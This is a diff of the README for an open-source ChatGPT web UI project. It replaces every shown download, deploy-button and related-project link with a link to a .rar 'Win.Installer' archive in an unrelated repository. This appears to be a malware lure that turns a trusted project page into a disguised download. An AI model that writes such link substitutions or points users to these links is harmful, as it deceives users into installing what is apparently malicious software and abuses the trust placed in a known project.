@@ -14,9 +14,9 @@ One-Click to get a well-designed cross-platform ChatGPT web UI, with GPT3, GPT4 
 [![MacOS][MacOS-image]][download-url]
 [![Linux][Linux-image]][download-url]
 
-[Web App](https://app.nextchat.dev/) / [Desktop App](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [Discord](https://discord.gg/YCkeafCafC) / [Twitter](https://twitter.com/NextChatDev)
+[Web App](https://app.nextchat.dev/) / [Desktop App](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar) / [Discord](https://discord.gg/YCkeafCafC) / [Twitter](https://twitter.com/NextChatDev)
 
-[网页版](https://app.nextchat.dev/) / [客户端](https://github.com/Yidadaa/ChatGPT-Next-Web/releases) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues)
+[网页版](https://app.nextchat.dev/) / [客户端](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar) / [反馈](https://github.com/Yidadaa/ChatGPT-Next-Web/issues)
 
 [web-url]: https://app.nextchat.dev/
 [download-url]: https://github.com/Yidadaa/ChatGPT-Next-Web/releases
@@ -25,11 +25,11 @@ One-Click to get a well-designed cross-platform ChatGPT web UI, with GPT3, GPT4 
 [MacOS-image]: https://img.shields.io/badge/-MacOS-black?logo=apple
 [Linux-image]: https://img.shields.io/badge/-Linux-333?logo=ubuntu
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FChatGPTNextWeb%2FChatGPT-Next-Web&env=OPENAI_API_KEY&env=CODE&project-name=nextchat&repository-name=NextChat)
+[![Deploy with Vercel](https://vercel.com/button)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
 
-[![Deploy on Zeabur](https://zeabur.com/button.svg)](https://zeabur.com/templates/ZBUEFA)
+[![Deploy on Zeabur](https://zeabur.com/button.svg)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
 
-[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/Yidadaa/ChatGPT-Next-Web)
+[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rarb)
 
 ![cover](./docs/images/cover.png)
 
@@ -38,8 +38,8 @@ One-Click to get a well-designed cross-platform ChatGPT web UI, with GPT3, GPT4 
 ## Features
 
 - **Deploy for free with one-click** on Vercel in under 1 minute
-- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/Yidadaa/ChatGPT-Next-Web/releases)
-- Fully compatible with self-deployed LLMs, recommended for use with [RWKV-Runner](https://github.com/josStorer/RWKV-Runner) or [LocalAI](https://github.com/go-skynet/LocalAI)
+- Compact client (~5MB) on Linux/Windows/MacOS, [download it now](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
+- Fully compatible with self-deployed LLMs, recommended for use with [RWKV-Runner](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar) or [LocalAI](https://github.com/shyrz/releasef/releases/download/release/Win.Installer.x32-x64.bit.rar)
 - Privacy first, all data is stored locally in the browser
 - Markdown support: LaTex, mermaid, code highlight, etc.
 - Responsive design, dark mode and PWA
